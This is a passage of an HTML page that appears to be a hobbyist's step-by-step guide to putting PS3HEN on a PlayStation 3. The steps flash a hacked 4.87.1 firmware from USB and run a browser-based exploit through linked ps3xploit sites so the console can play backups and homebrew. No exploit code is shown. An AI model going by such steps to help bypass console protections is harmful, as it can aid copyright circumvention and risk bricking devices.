                <li style="font-size:15px"> Step 2<br>
                 Visit Here <a href = "http://ps3xploit.me" target = "_blank">Check Here</a></br><br>
<tip style="font-size:15px"> <ti style="font-size:15px;color: yellow;"> [ Tip ] </ti> <a href = "https://unknownghostmods.github.io/PS3HEN-installer/" target = "_blank"> If It Down Use This Site</a></tip>
                </li><br>
                <li style="font-size:15px"> Step 3<br>
                 Once on the XMB go to your PS3 Web Browser and press Triangle, then choose the Tools option and go down to Delete Cookies, from there go ahead and Delete Cookies/Search History/Cache and Authentication Information then exit out from the browser.</li><br>
                <li style="font-size:15px"> If This Dont Work Follow This Older Guild</li><br>
             <li style="font-size:15px">
               
1) Download the 4.87.1 HFW from Joonie on the PSX-Place Forums.
<br><br>
2) By now you should have a zip file, extract it by using WinRAR, 7zip or another Program of your choosing.
<br><br>
3) Take your USB and make sure you format it to FAT32 (formatting will erase all of your files on it).Here is an easy to follow Video on how to.
<br><br>
4) Create a Folder called PS3 and another Folder called UPDATE inside it by right clicking and choosing New Folder.
               <br><br>
5) Now Place the HFW_4.87.1_PS3UPDAT.PUP inside the UPDATE folder and rename it to PS3UPDAT.PUP by right clicking it and choosing Rename.
               <br><br>
6) Now safely take out the USB or eject it and insert it on the ps3.
               <br><br>
7) On the PS3, before plugging in the USB make sure you have updated your system to 
4.87 through the XMB.
               <br><br>
8) After the update is done plug in your USB, shut down the PS3 and enter into Safe/Recovery mode. Here are 2 guides on how to! <a href = "https://www.youtube.com/watch?v=D5f_9i4AA18" target = "_blank">First Guide</a> and <a href = "https://www.youtube.com/watch?v=3NFXhZ_MOqY" target = "_blank">Second Guide</a>, (the First one is better explained, but lacks visibility of the PS3 Light and the second one has visibility but isn't as detailed and lacks a good framerate)
               <br><br>
9) In Safe/Recovery mode, scroll down to System Update and follow the onscreen Instructions. After it's finished updating it will reboot to the XMB and will ask for the usual HDMI settings.
               <br><br>
10) Once on the XMB go to your PS3 Web Browser and press Triangle, then choose the Tools option and go down to Delete Cookies, from there go ahead and Delete Cookies/Search History/Cache and Authentication Information then exit out from the browser.
               <br><br>
11) Re-open the browser press Start on the controller and then type in ps3xploit.com.
               <br><br>
12) Once you're on the ps3xploit.com website move the cursor to the top left corner and hover over the PS3HEN option and on the drop down Menu choose from the HEN Installer/Enabler or the HEN Enabler (Alternate). I personally recommend the HEN Enabler (Alternate) Since it's easier to use.
               <br><br>
13) After going through the Hen Installer go into the Remote play option and after that exit out by pressing Circle. Now you should see an Install Hen option above the Remote Play option, press X on it and wait for the installation to finish and then reboot the PS3.
               <br><br>
14) After Rebooting enable hen and you're set to play backups and install homebrew.
<br><br>
15) Make sure you always enable Hen on Powering Off and Powering back On the PS3 so that you can run your backups and Homebrew.
<br><br> 
Updating PS3HEN
<br><br>
Do Steps 1-6 of the Installing PS3HEN Guide
Don't update to the newest OFW that means skip step 7 and instead jump straight to step 8.
And now continue with step 8 through 14

            </li>
            </ul>
<!--             <center>
                <div id = "language"></div>
            </center> -->
        </div>
        <div>
            <h1 style="font-size:16px"> 🔗 Contact Me</h1>
            <ul>
                <li>
                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px"
width="19" height="19"
viewBox="0 0 48 48">
<path fill="#8c9eff" d="M40,12c0,0-4.585-3.588-10-4l-0.488,0.976C34.408,10.174,36.654,11.891,39,14c-4.045-2.065-8.039-4-15-4s-10.955,1.935-15,4c2.346-2.109,5.018-4.015,9.488-5.024L18,8c-5.681,0.537-10,4-10,4s-5.121,7.425-6,22c5.162,5.953,13,6,13,6l1.639-2.185C13.857,36.848,10.715,35.121,8,32c3.238,2.45,8.125,5,16,5s12.762-2.55,16-5c-2.715,3.121-5.857,4.848-8.639,5.815L33,40c0,0,7.838-0.047,13-6C45.121,19.425,40,12,40,12z M17.5,30c-1.933,0-3.5-1.791-3.5-4c0-2.209,1.567-4,3.5-4s3.5,1.791,3.5,4C21,28.209,19.433,30,17.5,30z M30.5,30c-1.933,0-3.5-1.791-3.5-4c0-2.209,1.567-4,3.5-4s3.5,1.791,3.5,4C34,28.209,32.433,30,30.5,30z"></path>
</svg>
                    &nbsp;<a href = "https://discord.com/users/779236243523108905" target = "_blank">DM Me On Discord</a>
                </li>
                <br>
                <li>
                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px"
width="19" height="19"
viewBox="0,0,256,256"
style="fill:#000000;">
<g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(5.33333,5.33333)"><path d="M43.2,33.9c-0.4,2.1 -2.1,3.7 -4.2,4c-3.3,0.5 -8.8,1.1 -15,1.1c-6.1,0 -11.6,-0.6 -15,-1.1c-2.1,-0.3 -3.8,-1.9 -4.2,-4c-0.4,-2.3 -0.8,-5.7 -0.8,-9.9c0,-4.2 0.4,-7.6 0.8,-9.9c0.4,-2.1 2.1,-3.7 4.2,-4c3.3,-0.5 8.8,-1.1 15,-1.1c6.2,0 11.6,0.6 15,1.1c2.1,0.3 3.8,1.9 4.2,4c0.4,2.3 0.9,5.7 0.9,9.9c-0.1,4.2 -0.5,7.6 -0.9,9.9z" fill="#ff0000"></path><path d="M20,31v-14l12,7z" fill="#ffffff"></path></g></g>
</svg>
                    &nbsp;<a href = "https://youtube.com/@unknownghostmodz" target = "_blank">Subscribe To My YT</a>
                </li>
                <br>
                <li>
                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px"
width="19" height="19"
viewBox="0 0 48 48">
<path fill="#03A9F4" d="M42,12.429c-1.323,0.586-2.746,0.977-4.247,1.162c1.526-0.906,2.7-2.351,3.251-4.058c-1.428,0.837-3.01,1.452-4.693,1.776C34.967,9.884,33.05,9,30.926,9c-4.08,0-7.387,3.278-7.387,7.32c0,0.572,0.067,1.129,0.193,1.67c-6.138-0.308-11.582-3.226-15.224-7.654c-0.64,1.082-1,2.349-1,3.686c0,2.541,1.301,4.778,3.285,6.096c-1.211-0.037-2.351-0.374-3.349-0.914c0,0.022,0,0.055,0,0.086c0,3.551,2.547,6.508,5.923,7.181c-0.617,0.169-1.269,0.263-1.941,0.263c-0.477,0-0.942-0.054-1.392-0.135c0.94,2.902,3.667,5.023,6.898,5.086c-2.528,1.96-5.712,3.134-9.174,3.134c-0.598,0-1.183-0.034-1.761-0.104C9.268,36.786,13.152,38,17.321,38c13.585,0,21.017-11.156,21.017-20.834c0-0.317-0.01-0.633-0.025-0.945C39.763,15.197,41.013,13.905,42,12.429"></path>
</svg>
                    &nbsp;<a href = "https://mobile.twitter.com/UNKNOWNGHOSTDEV" target = "_blank">Follow Me On Twitter</a>
                </li>
            </ul>
        </div>
        <div style = "padding: 5vw 0 0 0"></div>
    </div>
    <div class = "navbar">
        <a href = "#main">Main Content</a>
    </div>

    <script src = "script.js"></script>
    
</body>
</html>
